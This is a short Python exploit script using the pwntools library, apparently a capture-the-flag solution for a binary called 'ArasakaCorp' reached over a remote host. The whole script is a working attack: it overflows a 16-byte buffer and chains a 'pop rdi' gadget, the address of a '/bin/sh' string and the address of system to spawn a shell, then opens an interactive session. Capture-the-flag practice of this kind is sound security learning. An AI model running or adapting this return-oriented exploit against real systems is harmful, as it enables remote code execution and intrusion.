from pwn import *

#io = process("./ArasakaCorp");
io = remote("nc.lagncra.sh", 8000)

buf = b'A'*16
pop_rdi = p64(0x004014e3)
bin_sh_str = p64(0x00402814)
system_addr = p64(0x004010e0)

payload = buf + pop_rdi + bin_sh_str + system_addr

io.sendline(payload)
io.sendline("")

io.interactive()
